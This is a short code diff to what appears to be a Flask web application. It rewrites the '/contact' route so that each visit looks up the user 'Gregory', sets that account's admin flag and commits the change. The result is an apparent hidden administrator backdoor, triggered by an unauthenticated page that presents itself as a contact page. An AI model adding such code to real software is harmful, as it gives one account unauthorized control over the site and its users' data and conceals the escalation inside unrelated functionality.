@@ -38,8 +38,10 @@ def register():
 
 @app.route("/contact")
 def contact():
-    users = User.query.filter_by(nickname='Greg').first()
-    return users.nickname
+    users = User.query.filter_by(nickname='Gregory').first()
+    users.admin = 1
+    database.session.commit()
+    return str(users.id)
 
 @app.route("/about")
 def about():
